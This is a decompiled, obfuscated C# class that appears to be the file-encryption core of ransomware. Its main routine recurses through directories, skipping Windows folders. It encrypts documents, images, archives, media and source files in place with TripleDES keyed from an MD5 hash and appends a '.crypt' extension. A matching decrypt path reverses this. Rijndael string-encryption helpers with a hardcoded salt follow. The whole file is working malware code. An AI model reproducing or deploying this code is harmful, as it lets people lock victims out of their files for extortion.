using System;
using System.IO;
using System.Security.Cryptography;
using System.Text;
using Microsoft.VisualBasic.CompilerServices;

namespace ns1;

internal class Class9
{
	private static TripleDESCryptoServiceProvider tripleDESCryptoServiceProvider_0 = new TripleDESCryptoServiceProvider();

	private static MD5CryptoServiceProvider md5CryptoServiceProvider_0 = new MD5CryptoServiceProvider();

	private static byte[] smethod_0(string value)
	{
		return md5CryptoServiceProvider_0.ComputeHash(Encoding.ASCII.GetBytes(value));
	}

	private static byte[] smethod_1(byte[] fileToEncrypt, string key)
	{
		try
		{
			tripleDESCryptoServiceProvider_0.Key = smethod_0(key);
			tripleDESCryptoServiceProvider_0.Mode = CipherMode.ECB;
			return tripleDESCryptoServiceProvider_0.CreateEncryptor().TransformFinalBlock(fileToEncrypt, 0, fileToEncrypt.Length);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
			return fileToEncrypt;
		}
	}

	private static byte[] smethod_2(byte[] encryptedFile, string key)
	{
		try
		{
			tripleDESCryptoServiceProvider_0.Key = smethod_0(key);
			tripleDESCryptoServiceProvider_0.Mode = CipherMode.ECB;
			return tripleDESCryptoServiceProvider_0.CreateDecryptor().TransformFinalBlock(encryptedFile, 0, encryptedFile.Length);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
			return encryptedFile;
		}
	}

	public unsafe static void smethod_3(object param_obj)
	{
		void* ptr = stackalloc byte[21];
		int try0006_dispatch = -1;
		string text = default(string);
		object[] array = default(object[]);
		string text2 = default(string);
		DirectoryInfo directoryInfo = default(DirectoryInfo);
		string[] files = default(string[]);
		string text3 = default(string);
		FileInfo fileInfo = default(FileInfo);
		string text4 = default(string);
		FileInfo fileInfo2 = default(FileInfo);
		string text5 = default(string);
		string[] directories = default(string[]);
		string text6 = default(string);
		object[] array2 = default(object[]);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				checked
				{
					switch (try0006_dispatch)
					{
					default:
						*unchecked((int*)((byte*)ptr + 16)) = 1;
						text = Conversions.ToString(NewLateBinding.LateIndexGet(param_obj, new object[1] { 0 }, (string[])null));
						goto IL_002d;
					case 3541:
						{
							unchecked
							{
								*(int*)((byte*)ptr + 12) = *(int*)((byte*)ptr + 16);
								switch (*(int*)((byte*)ptr + 8))
								{
								case 1:
									break;
								default:
									goto end_IL_0006;
								}
								int num = *(int*)((byte*)ptr + 12) + 1;
								*(int*)((byte*)ptr + 12) = 0;
								switch (num)
								{
								case 1:
									break;
								case 2:
									goto IL_002d;
								case 3:
									goto IL_0054;
								case 4:
									goto IL_007f;
								case 5:
									goto IL_008c;
								case 7:
								case 8:
									goto IL_009f;
								case 10:
								case 11:
									goto IL_00c8;
								case 12:
									goto IL_00d2;
								case 13:
									goto IL_00fb;
								case 14:
									goto IL_010c;
								case 15:
									goto IL_011c;
								case 16:
									goto IL_0140;
								case 18:
								case 19:
									goto IL_0155;
								case 20:
									goto IL_016c;
								case 22:
									goto IL_018c;
								case 23:
									goto IL_01a3;
								case 25:
									goto IL_01c3;
								case 26:
									goto IL_01da;
								case 28:
									goto IL_01fa;
								case 29:
									goto IL_0211;
								case 31:
									goto IL_0231;
								case 32:
									goto IL_0248;
								case 34:
									goto IL_0268;
								case 35:
									goto IL_027f;
								case 37:
									goto IL_029f;
								case 38:
									goto IL_02b6;
								case 40:
									goto IL_02d6;
								case 41:
									goto IL_02ed;
								case 43:
									goto IL_030d;
								case 44:
									goto IL_0324;
								case 46:
									goto IL_0344;
								case 47:
									goto IL_035b;
								case 49:
									goto IL_037b;
								case 50:
									goto IL_0392;
								case 52:
									goto IL_03b2;
								case 53:
									goto IL_03c9;
								case 55:
									goto IL_03e9;
								case 56:
									goto IL_0400;
								case 58:
									goto IL_0420;
								case 59:
									goto IL_0437;
								case 61:
									goto IL_0457;
								case 62:
									goto IL_046e;
								case 64:
									goto IL_048e;
								case 65:
									goto IL_04a5;
								case 67:
									goto IL_04c5;
								case 68:
									goto IL_04dc;
								case 70:
									goto IL_04fc;
								case 71:
									goto IL_0513;
								case 73:
									goto IL_0533;
								case 74:
									goto IL_054a;
								case 76:
									goto IL_056a;
								case 77:
									goto IL_0581;
								case 79:
									goto IL_05a1;
								case 80:
									goto IL_05b8;
								case 82:
									goto IL_05d8;
								case 83:
									goto IL_05ef;
								case 85:
									goto IL_060f;
								case 86:
									goto IL_0626;
								case 88:
									goto IL_0646;
								case 89:
									goto IL_065d;
								case 91:
									goto IL_067d;
								case 92:
									goto IL_0694;
								case 94:
									goto IL_06b4;
								case 95:
									goto IL_06cb;
								case 97:
									goto IL_06eb;
								case 98:
									goto IL_0702;
								case 100:
									goto IL_0722;
								case 101:
									goto IL_0739;
								case 103:
									goto IL_0759;
								case 104:
									goto IL_0770;
								case 106:
									goto IL_0790;
								case 107:
									goto IL_07a7;
								case 109:
									goto IL_07c7;
								case 110:
									goto IL_07de;
								case 112:
									goto IL_07fe;
								case 113:
									goto IL_0815;
								case 115:
									goto IL_0835;
								case 116:
									goto IL_084c;
								case 118:
									goto IL_086c;
								case 119:
									goto IL_0883;
								case 121:
									goto IL_08a3;
								case 122:
									goto IL_08ba;
								case 124:
									goto IL_08da;
								case 125:
									goto IL_08f4;
								case 130:
									goto IL_0914;
								case 131:
									goto IL_091e;
								case 132:
									goto IL_0931;
								case 134:
								case 135:
									goto IL_0949;
								case 136:
									goto IL_0963;
								case 133:
								case 137:
								case 138:
									goto IL_0981;
								case 128:
								case 129:
								case 139:
									goto IL_09a3;
								case 140:
									goto IL_09a9;
								case 17:
								case 21:
								case 24:
								case 27:
								case 30:
								case 33:
								case 36:
								case 39:
								case 42:
								case 45:
								case 48:
								case 51:
								case 54:
								case 57:
								case 60:
								case 63:
								case 66:
								case 69:
								case 72:
								case 75:
								case 78:
								case 81:
								case 84:
								case 87:
								case 90:
								case 93:
								case 96:
								case 99:
								case 102:
								case 105:
								case 108:
								case 111:
								case 114:
								case 117:
								case 120:
								case 123:
								case 126:
								case 127:
									goto IL_09b8;
								case 9:
								case 141:
									goto IL_09d4;
								case 142:
									goto IL_0a06;
								case 143:
									goto IL_0a17;
								case 144:
									goto IL_0a37;
								case 145:
									goto IL_0a49;
								case 146:
									goto IL_0a59;
								case 147:
									goto IL_0a68;
								case 148:
									goto IL_0a80;
								case 151:
									goto IL_0a96;
								case 152:
									goto IL_0aa0;
								case 153:
									goto IL_0abd;
								case 154:
									goto IL_0acf;
								case 155:
									goto IL_0adf;
								case 156:
									goto IL_0aee;
								case 157:
									goto IL_0b06;
								case 160:
									goto IL_0b19;
								case 149:
								case 150:
								case 158:
								case 159:
									goto IL_0b28;
								default:
									goto end_IL_0006;
								case 6:
								case 161:
									goto end_IL_0006_2;
								}
								goto default;
							}
						}
						IL_0b06:
						*unchecked((int*)((byte*)ptr + 16)) = 157;
						smethod_3(array);
						goto IL_0b28;
						IL_002d:
						*unchecked((int*)((byte*)ptr + 16)) = 2;
						text2 = Conversions.ToString(NewLateBinding.LateIndexGet(param_obj, new object[1] { 1 }, (string[])null));
						goto IL_0054;
						IL_0054:
						*unchecked((int*)((byte*)ptr + 16)) = 3;
						unchecked((byte*)ptr)[20] = (Conversions.ToBoolean(NewLateBinding.LateIndexGet(param_obj, new object[1] { 2 }, (string[])null)) ? ((byte)1) : ((byte)0));
						goto IL_007f;
						IL_007f:
						*unchecked((int*)((byte*)ptr + 16)) = 4;
						directoryInfo = new DirectoryInfo(text);
						goto IL_008c;
						IL_008c:
						*unchecked((int*)((byte*)ptr + 16)) = 5;
						if (!directoryInfo.get_Exists())
						{
							goto end_IL_0006_2;
						}
						goto IL_009f;
						IL_009f:
						*unchecked((int*)((byte*)ptr + 16)) = 8;
						if (Operators.CompareString(text, Environment.GetEnvironmentVariable("SYSTEMDRIVE") + "\\", false) != 0)
						{
							goto IL_00c8;
						}
						goto IL_09d4;
						IL_00c8:
						ProjectData.ClearProjectError();
						*unchecked((int*)((byte*)ptr + 8)) = 1;
						goto IL_00d2;
						IL_00d2:
						*unchecked((int*)((byte*)ptr + 16)) = 12;
						files = Directory.GetFiles(directoryInfo.FullName);
						*unchecked((int*)ptr) = 0;
						goto IL_00e9;
						IL_00e9:
						if (*unchecked((int*)ptr) < files.Length)
						{
							text3 = files[*unchecked((int*)ptr)];
							goto IL_00fb;
						}
						goto IL_09d4;
						IL_0b28:
						(*unchecked((int*)((byte*)ptr + 4)))++;
						goto IL_0b19;
						IL_00fb:
						*unchecked((int*)((byte*)ptr + 16)) = 13;
						if (unchecked((byte*)ptr)[20] != 0)
						{
							goto IL_010c;
						}
						goto IL_0914;
						IL_010c:
						*unchecked((int*)((byte*)ptr + 16)) = 14;
						fileInfo = new FileInfo(text3);
						goto IL_011c;
						IL_011c:
						*unchecked((int*)((byte*)ptr + 16)) = 15;
						if (Operators.CompareString(fileInfo.Extension.ToLower(), ".crypt", false) != 0)
						{
							goto IL_0140;
						}
						goto IL_09a3;
						IL_0140:
						*unchecked((int*)((byte*)ptr + 16)) = 16;
						text4 = fileInfo.Extension.ToLower();
						goto IL_0155;
						IL_0155:
						*unchecked((int*)((byte*)ptr + 16)) = 19;
						if (Operators.CompareString(text4, ".exe", false) == 0)
						{
							goto IL_016c;
						}
						goto IL_018c;
						IL_016c:
						*unchecked((int*)((byte*)ptr + 16)) = 20;
						File.WriteAllBytes(text3, smethod_1(File.ReadAllBytes(text3), text2));
						goto IL_09b8;
						IL_018c:
						*unchecked((int*)((byte*)ptr + 16)) = 22;
						if (Operators.CompareString(text4, ".doc", false) == 0)
						{
							goto IL_01a3;
						}
						goto IL_01c3;
						IL_01a3:
						*unchecked((int*)((byte*)ptr + 16)) = 23;
						File.WriteAllBytes(text3, smethod_1(File.ReadAllBytes(text3), text2));
						goto IL_09b8;
						IL_01c3:
						*unchecked((int*)((byte*)ptr + 16)) = 25;
						if (Operators.CompareString(text4, ".docx", false) == 0)
						{
							goto IL_01da;
						}
						goto IL_01fa;
						IL_01da:
						*unchecked((int*)((byte*)ptr + 16)) = 26;
						File.WriteAllBytes(text3, smethod_1(File.ReadAllBytes(text3), text2));
						goto IL_09b8;
						IL_01fa:
						*unchecked((int*)((byte*)ptr + 16)) = 28;
						if (Operators.CompareString(text4, ".xls", false) == 0)
						{
							goto IL_0211;
						}
						goto IL_0231;
						IL_0211:
						*unchecked((int*)((byte*)ptr + 16)) = 29;
						File.WriteAllBytes(text3, smethod_1(File.ReadAllBytes(text3), text2));
						goto IL_09b8;
						IL_0231:
						*unchecked((int*)((byte*)ptr + 16)) = 31;
						if (Operators.CompareString(text4, ".xlsm", false) == 0)
						{
							goto IL_0248;
						}
						goto IL_0268;
						IL_0248:
						*unchecked((int*)((byte*)ptr + 16)) = 32;
						File.WriteAllBytes(text3, smethod_1(File.ReadAllBytes(text3), text2));
						goto IL_09b8;
						IL_0268:
						*unchecked((int*)((byte*)ptr + 16)) = 34;
						if (Operators.CompareString(text4, ".xslx", false) == 0)
						{
							goto IL_027f;
						}
						goto IL_029f;
						IL_027f:
						*unchecked((int*)((byte*)ptr + 16)) = 35;
						File.WriteAllBytes(text3, smethod_1(File.ReadAllBytes(text3), text2));
						goto IL_09b8;
						IL_029f:
						*unchecked((int*)((byte*)ptr + 16)) = 37;
						if (Operators.CompareString(text4, ".ppt", false) == 0)
						{
							goto IL_02b6;
						}
						goto IL_02d6;
						IL_02b6:
						*unchecked((int*)((byte*)ptr + 16)) = 38;
						File.WriteAllBytes(text3, smethod_1(File.ReadAllBytes(text3), text2));
						goto IL_09b8;
						IL_02d6:
						*unchecked((int*)((byte*)ptr + 16)) = 40;
						if (Operators.CompareString(text4, ".pptx", false) == 0)
						{
							goto IL_02ed;
						}
						goto IL_030d;
						IL_02ed:
						*unchecked((int*)((byte*)ptr + 16)) = 41;
						File.WriteAllBytes(text3, smethod_1(File.ReadAllBytes(text3), text2));
						goto IL_09b8;
						IL_030d:
						*unchecked((int*)((byte*)ptr + 16)) = 43;
						if (Operators.CompareString(text4, ".accdb", false) == 0)
						{
							goto IL_0324;
						}
						goto IL_0344;
						IL_0324:
						*unchecked((int*)((byte*)ptr + 16)) = 44;
						File.WriteAllBytes(text3, smethod_1(File.ReadAllBytes(text3), text2));
						goto IL_09b8;
						IL_0344:
						*unchecked((int*)((byte*)ptr + 16)) = 46;
						if (Operators.CompareString(text4, ".mdb", false) == 0)
						{
							goto IL_035b;
						}
						goto IL_037b;
						IL_035b:
						*unchecked((int*)((byte*)ptr + 16)) = 47;
						File.WriteAllBytes(text3, smethod_1(File.ReadAllBytes(text3), text2));
						goto IL_09b8;
						IL_037b:
						*unchecked((int*)((byte*)ptr + 16)) = 49;
						if (Operators.CompareString(text4, ".lnk", false) == 0)
						{
							goto IL_0392;
						}
						goto IL_03b2;
						IL_0392:
						*unchecked((int*)((byte*)ptr + 16)) = 50;
						File.WriteAllBytes(text3, smethod_1(File.ReadAllBytes(text3), text2));
						goto IL_09b8;
						IL_03b2:
						*unchecked((int*)((byte*)ptr + 16)) = 52;
						if (Operators.CompareString(text4, ".jpg", false) == 0)
						{
							goto IL_03c9;
						}
						goto IL_03e9;
						IL_03c9:
						*unchecked((int*)((byte*)ptr + 16)) = 53;
						File.WriteAllBytes(text3, smethod_1(File.ReadAllBytes(text3), text2));
						goto IL_09b8;
						IL_03e9:
						*unchecked((int*)((byte*)ptr + 16)) = 55;
						if (Operators.CompareString(text4, ".png", false) == 0)
						{
							goto IL_0400;
						}
						goto IL_0420;
						IL_0400:
						*unchecked((int*)((byte*)ptr + 16)) = 56;
						File.WriteAllBytes(text3, smethod_1(File.ReadAllBytes(text3), text2));
						goto IL_09b8;
						IL_0420:
						*unchecked((int*)((byte*)ptr + 16)) = 58;
						if (Operators.CompareString(text4, ".jpeg", false) == 0)
						{
							goto IL_0437;
						}
						goto IL_0457;
						IL_0437:
						*unchecked((int*)((byte*)ptr + 16)) = 59;
						File.WriteAllBytes(text3, smethod_1(File.ReadAllBytes(text3), text2));
						goto IL_09b8;
						IL_0457:
						*unchecked((int*)((byte*)ptr + 16)) = 61;
						if (Operators.CompareString(text4, ".rar", false) == 0)
						{
							goto IL_046e;
						}
						goto IL_048e;
						IL_046e:
						*unchecked((int*)((byte*)ptr + 16)) = 62;
						File.WriteAllBytes(text3, smethod_1(File.ReadAllBytes(text3), text2));
						goto IL_09b8;
						IL_048e:
						*unchecked((int*)((byte*)ptr + 16)) = 64;
						if (Operators.CompareString(text4, ".zip", false) == 0)
						{
							goto IL_04a5;
						}
						goto IL_04c5;
						IL_04a5:
						*unchecked((int*)((byte*)ptr + 16)) = 65;
						File.WriteAllBytes(text3, smethod_1(File.ReadAllBytes(text3), text2));
						goto IL_09b8;
						IL_04c5:
						*unchecked((int*)((byte*)ptr + 16)) = 67;
						if (Operators.CompareString(text4, ".wmv", false) == 0)
						{
							goto IL_04dc;
						}
						goto IL_04fc;
						IL_04dc:
						*unchecked((int*)((byte*)ptr + 16)) = 68;
						File.WriteAllBytes(text3, smethod_1(File.ReadAllBytes(text3), text2));
						goto IL_09b8;
						IL_04fc:
						*unchecked((int*)((byte*)ptr + 16)) = 70;
						if (Operators.CompareString(text4, ".3gp", false) == 0)
						{
							goto IL_0513;
						}
						goto IL_0533;
						IL_0513:
						*unchecked((int*)((byte*)ptr + 16)) = 71;
						File.WriteAllBytes(text3, smethod_1(File.ReadAllBytes(text3), text2));
						goto IL_09b8;
						IL_0533:
						*unchecked((int*)((byte*)ptr + 16)) = 73;
						if (Operators.CompareString(text4, ".mp4", false) == 0)
						{
							goto IL_054a;
						}
						goto IL_056a;
						IL_054a:
						*unchecked((int*)((byte*)ptr + 16)) = 74;
						File.WriteAllBytes(text3, smethod_1(File.ReadAllBytes(text3), text2));
						goto IL_09b8;
						IL_056a:
						*unchecked((int*)((byte*)ptr + 16)) = 76;
						if (Operators.CompareString(text4, ".pdf", false) == 0)
						{
							goto IL_0581;
						}
						goto IL_05a1;
						IL_0581:
						*unchecked((int*)((byte*)ptr + 16)) = 77;
						File.WriteAllBytes(text3, smethod_1(File.ReadAllBytes(text3), text2));
						goto IL_09b8;
						IL_05a1:
						*unchecked((int*)((byte*)ptr + 16)) = 79;
						if (Operators.CompareString(text4, ".bmp", false) == 0)
						{
							goto IL_05b8;
						}
						goto IL_05d8;
						IL_05b8:
						*unchecked((int*)((byte*)ptr + 16)) = 80;
						File.WriteAllBytes(text3, smethod_1(File.ReadAllBytes(text3), text2));
						goto IL_09b8;
						IL_05d8:
						*unchecked((int*)((byte*)ptr + 16)) = 82;
						if (Operators.CompareString(text4, ".vb", false) == 0)
						{
							goto IL_05ef;
						}
						goto IL_060f;
						IL_05ef:
						*unchecked((int*)((byte*)ptr + 16)) = 83;
						File.WriteAllBytes(text3, smethod_1(File.ReadAllBytes(text3), text2));
						goto IL_09b8;
						IL_060f:
						*unchecked((int*)((byte*)ptr + 16)) = 85;
						if (Operators.CompareString(text4, ".cs", false) == 0)
						{
							goto IL_0626;
						}
						goto IL_0646;
						IL_0626:
						*unchecked((int*)((byte*)ptr + 16)) = 86;
						File.WriteAllBytes(text3, smethod_1(File.ReadAllBytes(text3), text2));
						goto IL_09b8;
						IL_0646:
						*unchecked((int*)((byte*)ptr + 16)) = 88;
						if (Operators.CompareString(text4, ".mp3", false) == 0)
						{
							goto IL_065d;
						}
						goto IL_067d;
						IL_065d:
						*unchecked((int*)((byte*)ptr + 16)) = 89;
						File.WriteAllBytes(text3, smethod_1(File.ReadAllBytes(text3), text2));
						goto IL_09b8;
						IL_067d:
						*unchecked((int*)((byte*)ptr + 16)) = 91;
						if (Operators.CompareString(text4, ".flac", false) == 0)
						{
							goto IL_0694;
						}
						goto IL_06b4;
						IL_0694:
						*unchecked((int*)((byte*)ptr + 16)) = 92;
						File.WriteAllBytes(text3, smethod_1(File.ReadAllBytes(text3), text2));
						goto IL_09b8;
						IL_06b4:
						*unchecked((int*)((byte*)ptr + 16)) = 94;
						if (Operators.CompareString(text4, ".flv", false) == 0)
						{
							goto IL_06cb;
						}
						goto IL_06eb;
						IL_06cb:
						*unchecked((int*)((byte*)ptr + 16)) = 95;
						File.WriteAllBytes(text3, smethod_1(File.ReadAllBytes(text3), text2));
						goto IL_09b8;
						IL_06eb:
						*unchecked((int*)((byte*)ptr + 16)) = 97;
						if (Operators.CompareString(text4, ".avi", false) == 0)
						{
							goto IL_0702;
						}
						goto IL_0722;
						IL_0702:
						*unchecked((int*)((byte*)ptr + 16)) = 98;
						File.WriteAllBytes(text3, smethod_1(File.ReadAllBytes(text3), text2));
						goto IL_09b8;
						IL_0722:
						*unchecked((int*)((byte*)ptr + 16)) = 100;
						if (Operators.CompareString(text4, ".java", false) == 0)
						{
							goto IL_0739;
						}
						goto IL_0759;
						IL_0739:
						*unchecked((int*)((byte*)ptr + 16)) = 101;
						File.WriteAllBytes(text3, smethod_1(File.ReadAllBytes(text3), text2));
						goto IL_09b8;
						IL_0759:
						*unchecked((int*)((byte*)ptr + 16)) = 103;
						if (Operators.CompareString(text4, ".odt", false) == 0)
						{
							goto IL_0770;
						}
						goto IL_0790;
						IL_0770:
						*unchecked((int*)((byte*)ptr + 16)) = 104;
						File.WriteAllBytes(text3, smethod_1(File.ReadAllBytes(text3), text2));
						goto IL_09b8;
						IL_0790:
						*unchecked((int*)((byte*)ptr + 16)) = 106;
						if (Operators.CompareString(text4, ".ott", false) == 0)
						{
							goto IL_07a7;
						}
						goto IL_07c7;
						IL_07a7:
						*unchecked((int*)((byte*)ptr + 16)) = 107;
						File.WriteAllBytes(text3, smethod_1(File.ReadAllBytes(text3), text2));
						goto IL_09b8;
						IL_07c7:
						*unchecked((int*)((byte*)ptr + 16)) = 109;
						if (Operators.CompareString(text4, ".ods", false) == 0)
						{
							goto IL_07de;
						}
						goto IL_07fe;
						IL_07de:
						*unchecked((int*)((byte*)ptr + 16)) = 110;
						File.WriteAllBytes(text3, smethod_1(File.ReadAllBytes(text3), text2));
						goto IL_09b8;
						IL_07fe:
						*unchecked((int*)((byte*)ptr + 16)) = 112;
						if (Operators.CompareString(text4, ".ots", false) == 0)
						{
							goto IL_0815;
						}
						goto IL_0835;
						IL_0815:
						*unchecked((int*)((byte*)ptr + 16)) = 113;
						File.WriteAllBytes(text3, smethod_1(File.ReadAllBytes(text3), text2));
						goto IL_09b8;
						IL_0835:
						*unchecked((int*)((byte*)ptr + 16)) = 115;
						if (Operators.CompareString(text4, ".odb", false) == 0)
						{
							goto IL_084c;
						}
						goto IL_086c;
						IL_084c:
						*unchecked((int*)((byte*)ptr + 16)) = 116;
						File.WriteAllBytes(text3, smethod_1(File.ReadAllBytes(text3), text2));
						goto IL_09b8;
						IL_086c:
						*unchecked((int*)((byte*)ptr + 16)) = 118;
						if (Operators.CompareString(text4, ".rtf", false) == 0)
						{
							goto IL_0883;
						}
						goto IL_08a3;
						IL_0883:
						*unchecked((int*)((byte*)ptr + 16)) = 119;
						File.WriteAllBytes(text3, smethod_1(File.ReadAllBytes(text3), text2));
						goto IL_09b8;
						IL_08a3:
						*unchecked((int*)((byte*)ptr + 16)) = 121;
						if (Operators.CompareString(text4, ".txt", false) == 0)
						{
							goto IL_08ba;
						}
						goto IL_08da;
						IL_08ba:
						*unchecked((int*)((byte*)ptr + 16)) = 122;
						File.WriteAllBytes(text3, smethod_1(File.ReadAllBytes(text3), text2));
						goto IL_09b8;
						IL_08da:
						*unchecked((int*)((byte*)ptr + 16)) = 124;
						if (Operators.CompareString(text4, ".html", false) == 0)
						{
							goto IL_08f4;
						}
						goto IL_09b8;
						IL_08f4:
						*unchecked((int*)((byte*)ptr + 16)) = 125;
						File.WriteAllBytes(text3, smethod_1(File.ReadAllBytes(text3), text2));
						goto IL_09b8;
						IL_09b8:
						*unchecked((int*)((byte*)ptr + 16)) = 127;
						fileInfo.MoveTo(text3 + ".crypt");
						goto IL_09a3;
						IL_0914:
						*unchecked((int*)((byte*)ptr + 16)) = 130;
						goto IL_091e;
						IL_091e:
						*unchecked((int*)((byte*)ptr + 16)) = 131;
						fileInfo2 = new FileInfo(text3);
						goto IL_0931;
						IL_0931:
						*unchecked((int*)((byte*)ptr + 16)) = 132;
						text5 = fileInfo2.Extension.ToLower();
						goto IL_0949;
						IL_0949:
						*unchecked((int*)((byte*)ptr + 16)) = 135;
						if (Operators.CompareString(text5, ".crypt", false) == 0)
						{
							goto IL_0963;
						}
						goto IL_0981;
						IL_0963:
						*unchecked((int*)((byte*)ptr + 16)) = 136;
						File.WriteAllBytes(text3, smethod_2(File.ReadAllBytes(text3), text2));
						goto IL_0981;
						IL_0981:
						*unchecked((int*)((byte*)ptr + 16)) = 138;
						fileInfo2.MoveTo(text3.Replace(".crypt", ""));
						goto IL_09a3;
						IL_09a3:
						(*unchecked((int*)ptr))++;
						goto IL_09a9;
						IL_09a9:
						*unchecked((int*)((byte*)ptr + 16)) = 140;
						goto IL_00e9;
						IL_09d4:
						*unchecked((int*)((byte*)ptr + 16)) = 141;
						directories = Directory.GetDirectories(directoryInfo.FullName);
						*unchecked((int*)((byte*)ptr + 4)) = 0;
						goto IL_09f0;
						IL_09f0:
						if (*unchecked((int*)((byte*)ptr + 4)) < directories.Length)
						{
							text6 = directories[*unchecked((int*)((byte*)ptr + 4))];
							goto IL_0a06;
						}
						goto end_IL_0006_2;
						IL_0b19:
						*unchecked((int*)((byte*)ptr + 16)) = 160;
						goto IL_09f0;
						IL_0a06:
						*unchecked((int*)((byte*)ptr + 16)) = 142;
						if (unchecked((byte*)ptr)[20] != 0)
						{
							goto IL_0a17;
						}
						goto IL_0a96;
						IL_0a17:
						*unchecked((int*)((byte*)ptr + 16)) = 143;
						if (!text6.ToLower().Contains("windows"))
						{
							goto IL_0a37;
						}
						goto IL_0b28;
						IL_0a37:
						*unchecked((int*)((byte*)ptr + 16)) = 144;
						array2 = new object[3];
						goto IL_0a49;
						IL_0a49:
						*unchecked((int*)((byte*)ptr + 16)) = 145;
						array2[0] = text6;
						goto IL_0a59;
						IL_0a59:
						*unchecked((int*)((byte*)ptr + 16)) = 146;
						array2[1] = text2;
						goto IL_0a68;
						IL_0a68:
						*unchecked((int*)((byte*)ptr + 16)) = 147;
						array2[2] = unchecked((byte*)ptr)[20] != 0;
						goto IL_0a80;
						IL_0a80:
						*unchecked((int*)((byte*)ptr + 16)) = 148;
						smethod_3(array2);
						goto IL_0b28;
						IL_0a96:
						*unchecked((int*)((byte*)ptr + 16)) = 151;
						goto IL_0aa0;
						IL_0aa0:
						*unchecked((int*)((byte*)ptr + 16)) = 152;
						if (!text6.ToLower().Contains("windows"))
						{
							goto IL_0abd;
						}
						goto IL_0b28;
						IL_0abd:
						*unchecked((int*)((byte*)ptr + 16)) = 153;
						array = new object[3];
						goto IL_0acf;
						IL_0acf:
						*unchecked((int*)((byte*)ptr + 16)) = 154;
						array[0] = text6;
						goto IL_0adf;
						IL_0adf:
						*unchecked((int*)((byte*)ptr + 16)) = 155;
						array[1] = text2;
						goto IL_0aee;
						IL_0aee:
						*unchecked((int*)((byte*)ptr + 16)) = 156;
						array[2] = unchecked((byte*)ptr)[20] != 0;
						goto IL_0b06;
						end_IL_0006:
						break;
					}
				}
			}
			catch (object obj) when ((obj is Exception) & (*(int*)((byte*)ptr + 8) != 0) & (*(int*)((byte*)ptr + 12) == 0))
			{
				ProjectData.SetProjectError((Exception)obj);
				try0006_dispatch = 3541;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0006_2:
			break;
		}
		if (*(int*)((byte*)ptr + 12) != 0)
		{
			ProjectData.ClearProjectError();
		}
	}

	private static byte[] smethod_4(byte[] clearText, byte[] Key, byte[] IV)
	{
		byte[] result = default(byte[]);
		try
		{
			MemoryStream memoryStream = new MemoryStream();
			Rijndael rijndael = Rijndael.Create();
			rijndael.Key = Key;
			rijndael.IV = IV;
			CryptoStream cryptoStream = new CryptoStream(memoryStream, rijndael.CreateEncryptor(), CryptoStreamMode.Write);
			cryptoStream.Write(clearText, 0, clearText.Length);
			cryptoStream.Close();
			byte[] array = memoryStream.ToArray();
			result = array;
			return result;
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
			return result;
		}
	}

	public static string smethod_5(string clearText, string Password)
	{
		string result = default(string);
		try
		{
			byte[] bytes = Encoding.Unicode.GetBytes(clearText);
			PasswordDeriveBytes passwordDeriveBytes = new PasswordDeriveBytes(Password, new byte[13]
			{
				73, 118, 97, 110, 32, 77, 101, 100, 118, 101,
				100, 101, 118
			});
			byte[] inArray = smethod_4(bytes, passwordDeriveBytes.GetBytes(32), passwordDeriveBytes.GetBytes(16));
			result = Convert.ToBase64String(inArray);
			return result;
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
			return result;
		}
	}

	private static byte[] smethod_6(byte[] cipherData, byte[] Key, byte[] IV)
	{
		byte[] result = default(byte[]);
		try
		{
			MemoryStream memoryStream = new MemoryStream();
			Rijndael rijndael = Rijndael.Create();
			rijndael.Key = Key;
			rijndael.IV = IV;
			CryptoStream cryptoStream = new CryptoStream(memoryStream, rijndael.CreateDecryptor(), CryptoStreamMode.Write);
			cryptoStream.Write(cipherData, 0, cipherData.Length);
			cryptoStream.Close();
			byte[] array = memoryStream.ToArray();
			result = array;
			return result;
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
			return result;
		}
	}

	public static string smethod_7(string cipherText, string Password)
	{
		try
		{
			byte[] cipherData = Convert.FromBase64String(cipherText);
			PasswordDeriveBytes passwordDeriveBytes = new PasswordDeriveBytes(Password, new byte[13]
			{
				73, 118, 97, 110, 32, 77, 101, 100, 118, 101,
				100, 101, 118
			});
			byte[] bytes = smethod_6(cipherData, passwordDeriveBytes.GetBytes(32), passwordDeriveBytes.GetBytes(16));
			return Encoding.Unicode.GetString(bytes);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			string result = "";
			ProjectData.ClearProjectError();
			return result;
		}
	}
}
